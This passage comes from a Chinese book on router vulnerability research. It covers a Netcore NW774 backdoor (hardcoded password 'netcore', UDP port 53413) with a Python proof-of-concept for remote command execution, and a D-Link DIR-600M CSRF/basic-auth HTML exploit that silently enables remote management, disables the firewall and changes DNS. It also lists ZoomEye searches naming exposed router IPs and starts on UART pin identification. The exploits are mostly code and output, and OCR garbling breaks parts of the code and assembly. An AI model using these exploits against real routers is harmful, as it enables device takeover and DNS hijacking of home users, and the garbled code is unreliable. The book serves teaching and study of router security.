break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F26</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F27</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F28</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F29</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F30</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F31</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F32</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F33</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F34</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F35</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F36</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F37</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F38</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F39</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F40</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F41</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F42</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F43</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F44</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402F45</td><td style='text-align: center; word-wrap: break-word;'>1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00</td><td style='text-align: center; word-wrap: break-word;'></td></tr></table>

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>00402C20 SW</td><td style='text-align: center; word-wrap: break-word;'>$zero, $x7+y3r_54($sp)</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402C30 SW</td><td style='text-align: center; word-wrap: break-word;'>$zero, $x7+var_50($sp)</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402C34 SW</td><td style='text-align: center; word-wrap: break-word;'>$zero, $x7+var_4C($sp)</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402C38 SW</td><td style='text-align: center; word-wrap: break-word;'>$zero, $x7+var_13($sp)</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402C3C SW</td><td style='text-align: center; word-wrap: break-word;'>$zero, $x7+var_14($sp)</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402C40 SW</td><td style='text-align: center; word-wrap: break-word;'>$zero, $x7+var_40($sp)</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402C44 SW</td><td style='text-align: center; word-wrap: break-word;'>$zero, $x7+var_3C($sp)</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402C48 SW</td><td style='text-align: center; word-wrap: break-word;'>$zero, $x7+var_33($sp)</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402C4C SW</td><td style='text-align: center; word-wrap: break-word;'>$zero, $x7+var_34($sp)</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402C50 SW</td><td style='text-align: center; word-wrap: break-word;'>$zero, $x7+var_35($sp)</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402C54 SW</td><td style='text-align: center; word-wrap: break-word;'>$zero, $x7+var_2C($sp)</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402C58 sh</td><td style='text-align: center; word-wrap: break-word;'>$zero, $x7+var_23($sp)</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402C5C addiu</td><td style='text-align: center; word-wrap: break-word;'>$a0, $sp, $x7+var_53</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402C50 lui</td><td style='text-align: center; word-wrap: break-word;'>$a1</td></tr><tr><td colspan="2">getBr0IP</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402C68 la</td><td style='text-align: center; word-wrap: break-word;'>$a1, aBr0</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402C5C LW</td><td style='text-align: center; word-wrap: break-word;'>$gp, $x7+var_50($sp)</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402C70 lw</td><td style='text-align: center; word-wrap: break-word;'>$v0, dword_42BD50</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402C78 beqz</td><td style='text-align: center; word-wrap: break-word;'>$v0, loc_402C8C</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402C7C lu1</td><td style='text-align: center; word-wrap: break-word;'>$v0,</td></tr></table>

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td colspan="3">00402C8C</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402C8C loc_402C8C:</td><td style='text-align: center; word-wrap: break-word;'># AF_INET</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402C8C l1 $a0, 2</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402C90 l1 $a1, 1</td><td style='text-align: center; word-wrap: break-word;'># SOCK_STREAM</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402C94 la $t9; unk 40850540</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402C9C l1 $a2, 0x11</td><td style='text-align: center; word-wrap: break-word;'># IPPROTO_UDP</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402CA0 LW $gp, 0x/e+var_60($sp)</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402CA4 bgez $v0, loc_402CCC</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00402CA8 move $s0, $v0</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td></tr></table>

 </div>

调用 ioctl 获取 br0 网卡地址信息，如图 14-7 所示。

 </div>

getBr0IP 函数获取 br0 网卡的 IP 地址以后，程序就会在该端口绑定 UDP 端口 53413，如图 14-8 所示。

 </div>

完成绑定以后，程序会在 0x00402F18 处调用 event_loop。这里的 event_loop 用于完成整个后门命令字的接收、执行传送的命令字及执行结果的回传，是该后门的核心处理代码。

通过对 event_loop 函数进行逆向分析，该后门漏洞支持的通信命令协议总结如图 14-9 所示。

对 event_loop 函数进行逆向分析，还可以将该函数抽象为如下伪代码。

伪代码 event_loop

揭秘家用路由器 0day 漏洞挖掘技术

3 guard var = 0;
4 char command[...];
5 while True:
6 rlen = recvfrom(sock, command, ...);
7 cmdopt = command[2:4]; //命令选项
8 opt = command[4:6]; //命令附加选项
9 cmd = command[8:]; //命令内容
10 if rlen < 0:
11     continue;
12     if guard_var == 0:
13     //如果全局的“已登录标记”为0，则进入登录检查流程
14     if checklogin(cmd) < 1:
15         guard_var = 1; //登录成功，修改全局已登录标记
16 else:
17         continue; //登录失败
18     else:
19     //登录成功后，根据命令执行
20         if cmdopt == 0:
21         //执行命令模式（命令选项为0）
22         if rlen > 8:
23             rdata = strcmp(cmd, "?");
24             if rdata == 0:
25             //如果命令内容为“?”，则返回程序版本信息
26                    print 'IGD version...'
27                    elif rdata == 'S':
28                    //如果命令内容的第一个字节为“$”，
29                    //那么要执行的功能是MPT功能
30                    do_mptfun();
31                    else:
32                    //不是以上的
33                    do_syscmd();
34                    elif cmdopt == 1:
35                    //下载文件模式（命令选项为1）
36                    do_getfile();
37                    elif cmdopt == 2:
38                    //上传文件模式（命令选项为2）
39                    do_putfile();
40 }

根据对 event_loop 函数的逆向分析可知，该后门漏洞可以执行任意命令、上传和下载文件及 MPT 命令。下面选取登录验证和执行命令路由器命令函数的执行流程进行介绍。

在执行登录验证时，IGDMPTD 程序将命令字符串中的命令内容字段与硬编码的密码

“netcore”进行比较，如果相等，则登录验证通过，如图 14-10 所示。因此，NW774 路由器后门默认登录密码为 “netcore”。

 </div>

 </div>

登录验证成功后，在路由器重新启动之前都不会再验证密码。如果接收到的数据包中命令选项字段为“\x00\x00”，那么 IGDMTPTD 将进入执行路由器命令模式，调用 do_syscmd 函数，如图 14-11 所示。

 </div>

在 do_后代中通过调用 popen 执行命令内容字段中指定的命令。如图 14-12 所示，执行 “ls” 命令。

 </div>

路由器完成命令的执行以后，会将执行结果信息发回给攻击者。命令执行结果发送完毕，IGDMPTD会再次发送一条协议，通知攻击者执行结果信息已发送完毕，如图14-13所示。

 </div>

至此，后门漏洞执行任意路由器命令的流程就分析完了。该后门漏洞影响磊科全系列路由器，影响范围和危害等级都是很高的。通过对该漏洞的分析发现，该后门漏洞主要是由于磊科路由器内置的 IGDMTPTD 程序造成的。该程序会随路由器启动，并在公网上开放 UDP 协议的 53413 端口，攻击者可以在远程使用硬编码的默认密码登录路由器后门，进而在路由器上执行任意系统命令，上传和下载文件，以控制路由器。

## 14.3 漏洞利用

这种类型的后门漏洞不同于溢出漏洞，其利用的关键点在于对后门程序的执行流程和通信协议的分析。磊科路由器的这个后门漏洞有执行文件上传和下载、路由器命令及 MPT 命令的功能，在这里我们选取命令执行（do_mptfun 和 do_syscmd）来编写测试代码。实现漏洞利用的测试代码如下。

import struct
import time
BUFSIZE = 0x4000
SHELL = 0
FILEEND = 5
target = ('192.168.1.1', 53413)
def login():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(1)
    data = "pa" + "\x00\x00" + "word" + "netcore"
    sock.sendto(data, target)
    try:
        data, ADDR = sock.recvfrom(BUFSIZE)
        if 'success' in data:
            print['*'] Status: Valid current password, we logged in
        elif len(data) >= 12:
            print['+'] Status: you are currently logged in
    except:
        print[-] Status: Check your network
    def do_原文(cmdstring):
        cmd = SHELL
        HEAD = "pa" + struct.pack(">H", cmd) + "word"

23  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
24  sock.sendto(HEAD+cmdstring, target)
25  data = ''
26  while True:
27    dr,ADDR = sock.recvfrom(BUFSIZE)
28    cmd = FILEEND
29    endflag = struct.pack(">H", cmd)
30    if not dr:
31        break
32    if .endflag in dr[:8]:
33        break
34    data += dr[len("password"):]
35    print data
36    sock.close()
37  def do_mptfun(cmdstring):
38    cmd = SHELL
39    HEAD = "pa"+struct.pack(">H", cmd) + "word"
40    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
41    sock.sendto(HEAD+cmdstring, target)
42    dr,ADDR = sock.recvfrom(BUFSIZE)
43    print dr[12:]
44    sock.close()
45  def execCommand():
46    while True:
47        cmdstring = raw_input('>')
48        if not cmdstring:
49            break
50        if cmdstring[0] == '$' or cmdstring[0] == '?':
51            do_mptfun(cmdstring)
52        else:
53            do_syscmd(cmdstring)
54    if __name__ == "__main__":
55        login()
56    execCommand()

第 10 行：构造登录协议数据包。

第 11 行：发送构造的登录协议数据包。

第 13 行：接收返回数据。如果密码正确，在返回数据包中会包含“success”字符串。

第 21 行～第 22 行：构造 do_syscmd 协议数据。

第 23 行：将构造的 do_syscmd 协议数据发送到路由器。

第 26 行～第 34 行：接收命令执行结果。当接收到字符串的命令头中命令选项字段为结束符（如 “\x00\x05”）时停止接收。

第 35 行：完成一次命令的执行，打印接收的命令执行结果数据。

第 38 行～第 39 行：构造 do_mptfun 协议数据。

第 41 行～第 43 行：发送 do_mptfun 数据，接收命令执行结果数据并打印执行结果。

第 47 行：获取攻击者要执行的命令字符串。

第 50 行：如果获取的攻击者要执行的命令以“$”开头，将命令字段传递给 do_mptfun 函数并执行；如果以“？”开头，也调用 do_mptfun 函数。

第 53 行：如果获取的攻击者要执行的命令不是以“$”或“？”开头，就执行 do_syscmd 函数。

第 55 行：通过默认密码 “netcore” 登录路由器。

第 56 行：执行命令循环。

## 14.4 漏洞测试

##### 测试环境

将 netcore NW774 路由器与攻击机连接（有线或无线连接均可），将 1.1.26171 版本的固件更新到路由器中。

##### 测试流程

01 打开网页，访问网关（路由器）。这里的网关是 192.168.1.1。浏览器访问 192.168.1.1，登录 WRT54G 路由器以后，在首页上可以看到当前路由器的型号和固件版本。

02 执行测试脚本 netcore_POC.py。

03 执行任意命令。

整个过程如图 14-14 所示。

该 POC 脚本可以执行 MPT 功能和路由器系统命令。输入 “$Help”，可以显示当前路由器支持的 MPT 功能，如图 14-15 所示。

读取 Web 管理界面密码的 MPT 功能演示，如图 14-16 所示。

该 POC 还可以执行路由器系统命令。执行查看 CPU 信息的命令，如图 14-17 所示。

 </div>

 </div>

Python 2.7.1 (r271:86832, Nov 27 2010, 18:30:46) [MSC v.1500 32 bit (Intel)] on win32
Type "copyright", "credits" or "license()" for more information.
>>> _____ RESTART _____
>>>
[+] Status: you are currently logged in
>$ReadWWwPasswd
admin
✗

 </div>

Python 2.7.1 (r271:86832, Nov 27 2010, 18:30:46) [MSC v.1500 32 bit (Intel)] on win32
Type "copyright", "credits" or "license()" for more information.
>>> _____ RESTART _____
>>>
[+] Status: you are currently logged in
>cat /proc/cpuinfo
system type : RTL8881a
processor : 0
cpu model : 56322
BogoMIPS : 519.37
hardware watchpoint : no
tlb entries : 64
mips16 implemented : yes
>

 </div>

## 第 15 章 D-Link DIR-600M 路由器 Web 漏洞分析

本章以 D-Link DIR-600M 路由器为例，对路由器的 Web 漏洞进行分析并给出利用方法。

## 15.1 漏洞介绍

D-Link DIR-600M 路由器在安全方面内置了防火墙，能保护网络，抵御恶意攻击。它将遭受黑客攻击的危险性降到最低，并能阻止外来入侵。此外，DIR-600M 路由器添加了其他安全特性，如能分析网络流量的全状态数据包检测（SPI）防火墙和阻止用户访问限制性内容的家长控制。DIR-600M 路由器也支持 WEP、WPA 和 WPA2 加密，可有效防止“蹭网”现象的发生，其外观如图 15-1 所示。

 </div>

但就是这样一款在网络安全方面进行了加固的路由器，仍然存在安全问题。该款路由器主要针对网络上的直接攻击进行防御，而忽视了通过 CSRF 和基础认证漏洞结合起来进行的间接攻击。攻击者可诱骗受害者访问包含攻击代码的页面实现对 D-Link DIR-600M 路由器的控制。

## 15.2 漏洞分析

下面对该漏洞进行详细分析。

#### 15.2.1 权限认证分析

进入路由器管理界面，如图 15-2 所示，该界面是典型的基础认证界面。

 </div>

登录后查看网页请求头数据，如图 15-3 所示。

Request Headers view source
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp;/*;q=0.8
Accept-Encoding: g=ip,deflate,sdcn
Accept-Language: zh-CH,zh;q=0.8,de;q=0.6,en;q=0.4,fr;q=0.2,ko;q=0.2,zh-TW;q=0.2,ja;q=0.2
Authorization: Basic YRRTaW46YKRTaW4=
Cache-Control: max-age=0
Connection: keep-alive
Host: 192.168.0.1
Referer: http://192.168.0.1/
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOI64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36

 </div>

Authorization 参数是典型的基础认证记录信息，其中代码 “YWRtaW46YWRtaW4=” 为 Base64 编码，解析后为 “admin:admin”。

登录路由器管理页面后，在 Chrome 的调试界面查看网页中的 Cookie，如图 15-4 所示。

 </div>

该记录表明路由器管理网页没有存储 Cookie，登录权限与 Cookie 无关，因此，可以断定 D-Link DIR-600M 路由器的登录认证方式为基础认证。

使用默认账号 “admin”、密码 “admin”，构造 http://admin:admin@192.168.0.1 基础认证链接进行登录，可以直接登录路由器管理界面。

#### 15.2.2 数据提交分析

在路由器管理页面中设置开启远程管理选项并提交，分析提交数据。提交的页面是 http://192.168.0.1/apply.cgi，以 POST 方式提交，提交的参数如图 15-5 所示框中部分，其中 “remote_management=1” 就是设置开启远程控制的参数。

Remote Address: 192.168.0.1:80
Request URL: http://192.168.0.1/apply.cgi
Request Method: POST
Status Code: 200 OK
Request Headers view source
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip,deflate
Accept-Language: zh-CII,zh;q=0.8,de;q=0.6,en;q=0.4,fr;q=0.2,ko;q=0.2,zh-TW;q=0.2,ja;q=0.2
Authorization: Basic YkRtaW-35
Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 57
Content-Type: application/x-www-form-urlencoded
Host: 192.168.0.1
Origin: http://192.168.0.1
Referer: http://192.168.0.1/tools_admin.asp
User-Agent: Mozilla/5.0 (Windows NT 6.1; HK64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36
Form Data view source view URL encoded
CMD: restart
GO: tools_admin.asp
5ETO: remote_management=1
Response Headers view source
Cache-Control: no-cache
Connection: close
Content-Type: text/html
Date: Thu, 01 Jan 1970 00:00:49 GMT
Expires: 0
Pragma: no-cache
Server: httpd

 </div>

提交的参数中，仅有 HTTP 头部的基础认证 Authorization 参数对权限进行了验证，没有采用 Token、时间戳或验证码方式对 CSRF 漏洞进行防御。

## 15.3 漏洞利用

根据以上分析，可使用基础认证漏洞构造自动基础认证登录链接的方式获取路由器管理页面的权限，通过 CSRF 漏洞自动提交 POST 请求来修改路由器中的设置。

通过设置路由器的参数，可以实现远程控制和 DNS 劫持等攻击方式。因此，要设置路由器开启远程控制选项，关闭 SPI 防火墙用于接收来自外网的请求，修改路由器 DNS 参数实现 DNS 劫持（通过该方法接收用户的所有信息）。

利用基础认证自动登录漏洞实现隐蔽的路由器登录，利用 CSRF 漏洞隐蔽提交 POST 数据，在一次请求中完成 3 项修改，目标访问网页即可实现路由器参数的修改。poc.html 脚本代码如下。

<body style=display:none></body>
<script>
//创建iframe，访问http://admin:admin@192.168.0.1，实现基础认证登录
document.body.appendChild(document.getElementById("iframe")) .src="http://admin:admin@192.168.0.1";
//创建提交框架
function CreateIframe() {
    var pd=document.getElementById('iframe');
    pd.name="loginFrame";
    pd.width=0;
    pd.height=0;
    document.body.appendChild(pd);
}
//创建表单
function getNewSubmitForm(url) {
    var
        var submitForm;
    window.frames["loginFrame"].document.getElementById('FORM');
    submitForm.id="loginForm";
    submitForm.method = "POST";
    submitForm.action=url;
    window.frames["loginFrame"].document.body.尔特Child(submitForm);
    return submitForm;
}
//创建参数
function createNewFormElement(inputForm, elementName, elementValue) {
    var
        newElement=window.frames["loginFrame"].document.createElement("input");
        newElement.name=elementName;
        newElement.type="hidden";
        newElement.value=elementValue;
        inputForm.appendChild(newElement);
        return newElement;
    }

    //提交表单
}

揭秘家用路由器 0day 漏洞挖掘技术

function submitFrom() {
    setTimeout(function() {
        window.frames["loginFrame"] .document.getElementById('loginForm').submit();
    }, 1000);
}

// 隐蔽自动提交网页
CreateIframe();
var submitForm = getNewSubmitForm("http://192.168.0.1/apply.cgi");
createNewFormElement(submitForm, "SET0", "remote_management=1"); // 启用远程管理
createNewFormElement(submitForm, "SET1", "filter=off"); // 关闭SPI防火墙
createNewFormElement(submitForm, "SET2", "wan0_dns=8.8.8.8"); // 设置DNS submitFrom();
</script>

漏洞证明如图 15-6 所示。

 </div>

## 15.4 漏洞统计分析

在完成漏洞分析之后，有时可能希望对漏洞的影响范围进行统计。此时，可以通过对网络空间中的 IP 地址进行扫描来探测网络空间中可能受该漏洞影响的路由器的数量，以评估漏洞威胁的严重程度。

要想实现这一目标，我们可以借助一款优秀的网络空间搜索引擎——ZoomEye。

#### 15.4.1 ZoomEye简介

“ZoomEye”的中文名为“钟馗之眼”，它定位于网络空间搜索引擎，能对暴露在公网的主机设备及网站组件进行全方位搜索（只要有IP地址即可搜索），发现其中的漏洞，揪出网络中“藏着掖着的问题”。

#### 15.4.2 ZoomEye应用实例

下面我们通过 ZoomEye 对之前提到的 D-Link DIR-645 和 D-Link DIR-815 路由器的两个漏洞进行统计分析。

# 1. D-Link DIR-645路由器溢出漏洞

打开 ZoomEye 官网 www.zoomeye.org，输入关键字 “app:"D-Link DIR-645 WAP http config" ver:"1.03"”，如图 15-7 所示。

 </div>

单击 “搜索一下” 按钮，可以看到 ZoomEye 找到了 272 条相关记录，如图 15-8 所示。单击 24.73.154.86 这个 IP 地址旁边的图标，就可以在浏览器中打开一个新窗口查看相关信息。

揭秘家用路由器 0day 漏洞挖掘技术

 </div>

页面打开后如图 15-9 所示，该路由器管理页面可以正常访问。

 </div>

在 ZoomEye 搜索结果页面的左栏中还包含对搜索结果的统计信息，如服务类型、国家、城市、设备类型、应用程序、操作系统、端口等，如图 15-10 所示。

 </div>

从 ZoomEye 的搜索中我们可以发现，暴露在网络空间中的这 272 台 DIR-645 v1.03 路由器是相当危险的，随时都有可能被非法入侵。

# 2. D-Link DIR-815路由器漏洞探测

使用相同的方法，在 ZoomEye 中搜索关键字 “app:"D-Link DIR-815" ver:1.01 port:80”，如图 15-11 所示。

单击 “搜索一下” 按钮，可以看到一共找到了 13 个符合条件的 IP 地址，如图 15-12 所示。

选择第一个 IP 地址 24.181.14.26，使用浏览器打开，可以看到该路由器是可以访问的，如图 15-13 所示。

 </div>

 </div>

 </div>

该路由器使用的是之前分析过的存在漏洞的固件版本 v1.01，并且开放了 80 端口，增加了路由器被访问并导致执行任意代码的危险。从 ZoomEye 的搜索中我们可以发现，本书中分析的 D-Link DIR-815 v1.01 固件的溢出漏洞可能导致网络空间中 13 台路由器被入侵。

#### 15.4.3 小结

作为网络空间节点的搜索引擎，相比其他的搜索方式，ZoomEye 表现出来的查询能力更为直接，精确到后台系统版本的检索会让一些不怀好意的人更方便地找到攻击目标。但是，ZoomEye 能够直观地统计出漏洞的即时分布情况，在一定程度上感知安全事件的影响和动向。借助 ZoomEye，我们能感受到互联网的心跳，可以更加迅速地发现网络空间中存在的漏洞，并促使相关人员及时对相应的漏洞进行修复。

# 第 4 篇 路由器漏洞实例分析与利用 ——硬件篇

### 第 16 章 路由器硬件的提取

在前面的章节中，我们已经学习了如何从路由器固件中提取根文件系统，以及如何进行漏洞的分析和挖掘。从本章开始，我们会学习路由器硬件方面的一些基本知识。

通常我们都是通过路由器厂商获取可用的固件，但并不是每一个路由器厂商都提供了固件下载，或者部分型号的产品没有提供固件下载，这时我们就需要使用本章的技术，通过路由器硬件提供的接口将计算机与路由器主板连接，从当前的路由器中提取需要的数据。

## 16.1 硬件基础知识

本节我们来了解一下与路由器硬件相关的基础知识。

#### 16.1.1 路由器FLASH

FLASH 也叫闪存，是路由器中常用的一种内存类型。它是可读写的存储器，在系统重新启动或关机之后仍能保存数据。FLASH 中存放着当前正在使用的路由器操作系统等信息。

路由器的 FLASH 就像计算机的硬盘。我们的硬盘通常会被格式化成多个分区。同样的原理，FLASH 也被格式化为多个分区。通常情况下，FLASH 分成 4 个区块，其作用大致如下。

bootloader: 主要功能是对硬件环境进行初始化、更新固件及认识操作系统的文件格式并将内核加载到内存中去执行。“CFE”是“Common Firmware Environment”（统一固件环境）的缩写，它是Broadcom公司专门针对自己生产的MIPS架构的处理器开发的一款Bootloader软件，Linksys WRT54G v2路由器使用的就是CFE。

Kernel: 操作系统的内核。

Root Filesystem: 操作系统的根文件系统，如 squashfs、rootfs 等。

NVRAM: 作用是保存路由器中的配置文件。路由器在启动之后会从 NVRAM 中读取配置文件，对路由器进行设置。用户修改路由器设置后，系统会将修改后的参数写回 NVRAM 中。

路由器的 FLASH 中存储的数据对于我们进行路由器安全研究具有十分重要的意义。我们可以读取 NVRAM 中的配置信息，以了解当前路由器中的敏感信息，还可以从 FLASH 中提取固件，然后运用前面学过的知识进行漏洞分析和挖掘。接下来，我们就给出从硬件中提取这些数据的一些思路。

#### 16.1.2 硬件提取数据的思路

通过接触硬件进行数据提取的方法可谓多种多样，通常情况下可以考虑以下 3 种方案。

通过路由器主板上的 JTAG 接口提取 FLASH、NVRAM 等。这种方法的优点是只需要一根 JTAG 线，不需要太多的辅助设备，缺点是需要路由器 CPU 支持 JTAG，主板上要有 JTAG 接口。

从主板上取下的 FLASH 芯片中提取。这种方法可以在路由器不支持 JTAG 方式时使用，但缺点也很明显——从主板上取出芯片可能会对路由器造成物理损伤。

使用测试夹从 FLASH 芯片中提取。使用测试夹的优点是不需要从路由器上取下芯片，只需要用测试夹夹住芯片引脚即可，缺点是对不同引脚数的 FLASH 芯片需要使用对应的测试夹。

## 16.2 路由器串口

路由器的串口对于开发人员来说是很有用的，通常可以用串口实现以下功能。

访问路由器的 CFE。

观察 boot 和调试信息。

通过一个 Shell 与系统进行交互异步串行通信。

因此，这些功能对于我们进行路由器安全研究也具有相当大的益处。

在路由器中，我们要寻找的串口不是指通常所见的 RS232，而是指 UART（通用异步收发器），它是路由器设备中比较常见的一种接口。虽然 RS-232 和 UART 在协议方面是兼容的，但在电压上却不兼容。UART 通常在 3.3 伏特进行操作，但也可运行在其他标准电压（如 5 伏特、1.8 伏特等）下。在后文中，凡是关于路由器串口的描述，在没有特殊说明的情况下，都是指 UART。

如图 16-1 所示是 Linksys WRT54G v2.2 路由器主板上的串行接口。

 </div>

### 16.2.1 探测串口

下面我们使用基本的观察法和万用表从复杂的路由器主板中找出 UART，并确定 UART 的每一个引脚的用途。由于 UART 的非标准化，这里演示的方法并非 “放之四海而皆准”。本节以 Linksys WRT54G v2 路由器为例，其主板上一共有 2 个串口，接下来就演示一些基本的判定路由器串口的方法。

首先，我们通过肉眼观察路由器主板上的引脚。一般来说，UART至少包含以下4个引脚。

Vcc（VCC）：电源电压。该引脚电压较稳定。

➢ Ground（GND）：接地。该引脚电压通常为 0。

➢ Transmit（TXD）：数据发送引脚。

Receive（RXD）：数据接收引脚。

也就是说，我们首先要注意在路由器主板上那些单行具有 4~6 个引脚的位置。但这种方法不一定在任何时候都有效，因为这些引脚的位置是由各个厂商设计的，没有统一的标准。WRT54G 路由器主板上的 UART 的位置如图 16-2 所示。

 </div>

通过观察发现，“JP1”字样的方框内是最符合 URAT 标志的 WRT54G 路由器主板的串口位置，在主板上已经标明了引脚的编号，以此来定位每一个引脚。

找到路由器串口以后，我们需要区分这些引脚的功能。这里给出以下两种方法，通过这两种方法的配合，可以快速识别每一个引脚的作用。

# 1. 目测法

主板在印刷时都会遵循一些规律，这些规律可以帮助我们识别串口的引脚。

##### （1）VCC引脚的特点

VCC 引脚通常被做成方形，如 WRT54G 路由器主板上的 1 号引脚。从路由器主板上可以看到较宽的走线，那么该引脚极有可能也是 VCC 引脚，如 WRT54G 路由器主板上的 2 号引脚。

##### (2) GND引脚的特点

GND 引脚通常存在多条走线连接到周围的地线（GND）。如图 16-3 所示，将 WRT54G 路由器主板放大后，可以看到 9 号和 10 号引脚都有 2 条走线连接周围的地线。

如果说在 WRT54G 路由器的主板上看起来还不是那么明显，那么 WRT120N 路由器主板上的 9 号引脚就显得尤为突出了，一共有 8 条较细的走线连接周围的地线，如图 16-4 所示。

 </div>

 </div>

通过目测法可以初步判断 WRT54G 路由器主板上的 1 号和 2 号引脚为 VCC 引脚，9 号和 10 号引脚为 GND 引脚，但是仍然存在 6 个引脚。在这 6 个引脚中，我们需要区分 TXD 引脚和 RXD 引脚。在剩余的 6 个引脚中，可以看到 3 号、4 号、5 号、6 号这 4 个引脚分别有 4 条较细的走线连接，那么可以初步判断 TXD 和 RXD 在这 4 个引脚当中。但遗憾的是，如果想知道哪个引脚是 TXD 引脚，哪个引脚是 RXD 引脚，使用目测法无法得出确切的答案。通过目测法仅仅是初步判断，不能完全肯定，因此，我们需要通过下面的方法进行进一步的确定。

# 2. 万用表测试法

使用数字万用表进行测试，如图 16-5 所示。

 </div>

##### (1) 测试GND引脚

将万用表调到电阻测量的最小档。这里最小为 200 欧姆，因此选择电阻 200 欧姆档位。然后，我们需要确定万用表的两只表笔应该放在哪些位置。通常金属屏蔽是一个方便测试的接地点，因此，将一只表笔放在金属屏蔽罩上，用另一只表笔分别接触 10 个引脚，测试金属屏蔽罩与串口的 10 个引脚，电阻为 0 的引脚即为 GND 引脚。

在 WRT54G 路由器的主板上有一块金属屏蔽外壳，将黑色探针（万用表的负极探针）置于其上，然后使用另一根探针分别接触 10 个需要测试的引脚，如图 16-6 所示。

 </div>

测试 10 个引脚之后发现，只有 9 号和 10 号引脚的电阻非常接近 0，万用表显示电阻为 00.2 欧姆，如图 16-7 所示。

在这里，万用表电阻不为 0 的原因是万用表自身的电阻就是 40 欧姆（00.2×200）。可以尝试将两只表笔短接来测试万用表自身的电阻，如图 16-8 所示。因此，这里测得 WRT54G 路由器主板串口的 9 号和 10 号引脚的电阻其实是 0，也就是说，9 号和 10 号引脚均为 GND 引脚。

 </div>

 </div>

##### (2) 测试VCC

虽然 VCC 引脚对于我们使用路由器的串口是无关紧要的，但是确定 VCC 引脚可以排除它作为 RXD 引脚和 TXD 引脚的可能性，因此也是有必要的。在目测中，我们怀疑 1 号和 2 号引脚是 VCC 引脚，那么接下来我们就用万用表来验证这一猜测。

